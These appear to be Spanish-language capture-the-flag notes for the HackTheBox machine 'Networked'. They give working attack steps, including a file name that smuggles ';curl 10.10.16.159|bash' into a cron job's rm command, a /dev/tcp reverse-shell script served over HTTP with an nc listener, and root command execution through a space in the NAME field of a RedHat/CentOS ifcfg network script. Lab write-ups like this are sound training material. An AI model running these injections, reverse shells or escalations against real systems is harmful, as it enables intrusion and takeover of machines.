** Máquina Networked_HTB **
Tarea crontab que ejecuta 'check-attack.sh'.
Tarea que elimina los ficheros de /var/www/html/uploads.
Tarea que ejecuta una función: 
`/bin/rm -f $path$value`
Como ejemplo de cómo borraría un fichero subido a este directorio sería:  
`/bin/rm -f /var/www/html/uploads/s4vishell.php.jpg`

Secuestro sobre el nombre del fichero:
> Si nuestro fichero en vez de llamarse 's4vishell.php.jpg' se llamase 's4vishell.php.jpg; whoami'
> Esto provocaría que en el entorno de la shell, también se ejecutase la segunda instrucción a la hora de borrar el fichero.

Inyección de comandos (RCE):
> Creamos un archivo en /var/www/html/uploads
> `touch ";curl 10.10.16.159|bash"`
> Este archivo hará una petición web a un fichero index.html.
> En local, creamos fichero index.html
> `bash -i >& /dev/tcp/10.10.16.159/443 0>&1`
> Montamos servidor web para compartir index.html
> `python3 -m http.server 80`
> Abrimos puerto en escucha para recibir la reverse shell
> `nc -nlvp 443`
> Debemos esperar que la tarea crontab se ejecute y recibiremos una reverse shell como el usuario que esté ejecutando la tarea. En este caso específico es guly, por lo que estamos realizando un user-pivoting.

** Redhat/CentOS root through network-scripts **
https://seclists.org/fulldisclosure/2019/Apr/24

Los Network-Scripts, por ejemplo, ifcg-eth0, se utilizan para las conexiones de red. El aspecto es exactamente igual que los archivos .INI. Sin embargo, son provistos en Linux por Network Manager (dispatcher.d).

En este caso, el NAME = atributo que en estos scripts de red no se maneja correctamente. 
Si tiene un espacio en blanco en el nombre, hace que el sistema intente ejecutar lo que venga después del espacio en blanco. Lo que significa que todo lo que venga después del primero elemento, el nombre, se ejecutará como root.

Por ejemplo:

/etc/sysconfig/network-scripts/ifcfg-1337

NAME = Network /bin/id <= Tenga en cuenta el espacio en blanco, ejecutará el comando id
ONBOOT = sí
DISPOSITIVO = eth0

Otro ejemplo sería decirle que nos ejecute una bash, pero en este caso la ejecutará como el usuario root:
NAME = loquesea /bin/bash